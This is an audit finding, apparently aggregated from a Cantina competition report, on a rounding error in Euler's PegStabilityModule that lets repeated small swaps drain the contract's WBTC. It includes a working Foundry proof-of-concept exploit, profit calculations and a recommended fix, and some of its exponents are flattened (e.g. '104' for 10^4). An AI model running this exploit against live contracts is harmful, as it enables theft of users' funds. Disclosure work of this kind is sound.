---
# Core Classification
protocol: Euler
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 54215
audit_firm: Cantina
contest_link: https://cantina.xyz/portfolio/75df6661-6f99-4163-aadd-377cb8c1eb55
source_link: https://cdn.cantina.xyz/reports/cantina_competition_euler_may2024.pdf
github_link: none

# Impact Classification
severity: low
impact: security_vulnerability
exploitability: 0.00
financial_impact: low

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

protocol_categories:
  - dexes
  - cdp
  - services
  - yield_aggregator
  - cross_chain

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - mt030d
---

## Vulnerability Title

Incorrect rounding direction in PegStabilityModule allows attackers to drain the contract 

### Overview

See description below for full details.

### Original Finding Content

## PegStabilityModule Vulnerability Analysis

## Context
- PegStabilityModule.sol#L117-L127
- PegStabilityModule.sol#L139-L141
- PegStabilityModule.sol#L153-L155

## Description
In the `PegStabilityModule` contract, users can call `swapToSynthGivenOut()` to swap underlying assets for synth assets.

### Function: `swapToSynthGivenOut`
```solidity
function swapToSynthGivenOut(uint256 amountOut, address receiver) external returns (uint256) {
    uint256 amountIn = quoteToSynthGivenOut(amountOut);
    if (amountIn == 0 || amountOut == 0) {
        return 0;
    }
    underlying.safeTransferFrom(_msgSender(), address(this), amountIn);
    synth.mint(receiver, amountOut);
    return amountIn;
}
```
The `swapToSynthGivenOut()` function internally calls `quoteToSynthGivenOut()` to compute the required `amountIn` of underlying assets needed to swap for the desired `amountOut` of synth assets.

### Function: `quoteToSynthGivenOut`
```solidity
function quoteToSynthGivenOut(uint256 amountOut) public view returns (uint256) {
    return amountOut * BPS_SCALE * conversionPrice / (BPS_SCALE - TO_SYNTH_FEE) / PRICE_SCALE;
}
```
The issue arises when the decimals of the underlying asset are less than 18, leading to a `conversionPrice` that is less than `PRICE_SCALE`. Consequently, the `amountIn` computed by `quoteToSynthGivenOut()` may be less than expected due to precision loss, enabling users to swap fewer underlying assets for the synth assets.

### Example Scenario
Assuming the underlying asset is WBTC, which has 8 decimals (making the `conversionPrice` `1e10`), and setting `TO_SYNTH_FEE` to 30 for realism, the calculations are as follows:

When `amountOut` is `199399999` (approximately 2 wei WBTC), the `amountIn` calculated by `quoteToSynthGivenOut()` will be:
```
199399999 × 104 × 1010 / (104 - 30) / 1018
```
This results in `1` due to division truncation in Solidity. Therefore, if the user calls `swapToSynthGivenOut()` with `199399999` as `amountOut`, they effectively swap `1` wei WBTC for around `2` wei WBTC worth of synth assets. This process can be repeated multiple times, allowing users to drain the underlying assets in the `PegStabilityModule` contract.

Additionally, this attack is especially lucrative on Layer 2 solutions. For instance, on Arbitrum, the gas price can drop to as low as 0.01 gwei. Through executing `swapToSynthGivenOut()` 1000 times and then using `swapToUnderlyingGivenOut()` to swap back to WBTC:

- The attacker could receive `988` wei WBTC, worth around:
    ```
    65000 × 988 / 10^8 ≈ 0.64
    ```
- The gas usage is approximately `16201421`, costing around:
    ```
    3500 × 16201421 × 0.01 × 10^9 / 10^18 ≈ 0.57
    ```
This returns a profit greater than the costs incurred for the exploit.

### Related Issue
The `quoteToUnderlyingGivenOut()` function also suffers from similar precision loss issues as seen in `quoteToSynthGivenOut()`.

## Proof of Concept
The following Solidity code demonstrates the exploit:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {EVaultTestBase} from "./EVaultTestBase.t.sol";
import "../../../src/EVault/shared/types/Types.sol";
import "../../../src/EVault/shared/Constants.sol";
import {ESynth} from "../../../src/Synths/ESynth.sol";
import {PegStabilityModule} from "../../../src/Synths/PegStabilityModule.sol";
import {TestERC20} from "../../mocks/TestERC20.sol";
import "forge-std/console.sol";

contract POC_Test is EVaultTestBase {
    using TypesLib for uint256;

    uint256 public TO_UNDERLYING_FEE = 30;
    uint256 public TO_SYNTH_FEE = 30;
    uint256 public BPS_SCALE = 10000;
    uint256 public CONVERSION_PRICE = 1e10;
    uint256 public PRICE_SCALE = 1e18;

    TestERC20 WBTC;
    ESynth synth;
    PegStabilityModule psm;
    address alice = makeAddr("alice");

    function setUp() public override {
        super.setUp();
        WBTC = new TestERC20("Wrapped BTC", "WBTC", 8, false);
        synth = new ESynth(evc, "TestSynth", "TSYNTH");
        psm = new PegStabilityModule(
            address(evc), address(synth), address(WBTC), TO_UNDERLYING_FEE, TO_SYNTH_FEE, CONVERSION_PRICE
        );
        synth.setCapacity(address(psm), 100e18);
        WBTC.mint(address(psm), 100e8);
        WBTC.mint(alice, 1000);
        vm.startPrank(alice);
        WBTC.approve(address(psm), type(uint256).max);
        synth.approve(address(psm), type(uint256).max);
        vm.stopPrank();
    }

    function test_POC() external {
        vm.startPrank(alice);
        uint256 snapshot = vm.snapshot();
        console.log("initial user state:");
        console.log(" WBTC balance: %s", WBTC.balanceOf(alice));
        console.log(" Synth balance: %s", synth.balanceOf(alice));
        console.log();

        // exploit the incorrect rounding direction to swap more synth from underlying
        uint256 synthAmountOut = 0.997e8 * 2 - 1;
        uint256 wbtcAmountIn;
        for (uint256 i; i < 1000; i++) {
            uint256 amount = psm.swapToSynthGivenOut(synthAmountOut, alice);
            assertEq(amount, 1);
            wbtcAmountIn += amount;
        }
        console.log("user state after swapToSynthGivenOut loops:");
        console.log(" WBTC balance: %s", WBTC.balanceOf(alice));
        console.log(" Synth balance: %s", synth.balanceOf(alice));
        console.log();

        psm.swapToUnderlyingGivenOut(1988, alice);
        console.log("user state after swapToUnderlyingGivenOut:");
        console.log(" WBTC balance: %s", WBTC.balanceOf(alice));
        console.log(" Synth balance: %s", synth.balanceOf(alice));
        console.log();

        // estimate the gas usages
        vm.revertTo(snapshot);
        uint256 gasBefore = gasleft();
        for (uint256 i; i < 1000; i++) {
            psm.swapToSynthGivenOut(synthAmountOut, alice);
        }
        psm.swapToUnderlyingGivenOut(1988, alice);
        uint256 gasUsed = gasBefore - gasleft();
        console.log("gas used %s", gasUsed);
        vm.stopPrank();
    }
}
```

Place the above code in the file `test/unit/evault/POC.t.sol`, then run the command:
```bash
forge test --mc POC -vv
```

### Results
**Logs:**
- Initial user state:
  - WBTC balance: 1000
  - Synth balance: 0
  
- User state after `swapToSynthGivenOut` loops:
  - WBTC balance: 0
  - Synth balance: 199399999000
  
- User state after `swapToUnderlyingGivenOut`:
  - WBTC balance: 1988
  - Synth balance: 1804417
  
- Gas used: 16201421

## Recommendation
The `amountIn` value in `quoteToSynthGivenOut()` and `quoteToUnderlyingGivenOut()` should be rounded up to avoid precision loss issues.

### Metadata

| Field | Value |
|-------|-------|
| Impact | LOW |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Cantina |
| Protocol | Euler |
| Report Date | N/A |
| Finders | mt030d |

### Source Links

- **Source**: https://cdn.cantina.xyz/reports/cantina_competition_euler_may2024.pdf
- **GitHub**: N/A
- **Contest**: https://cantina.xyz/portfolio/75df6661-6f99-4163-aadd-377cb8c1eb55

### Keywords for Search

`vulnerability`

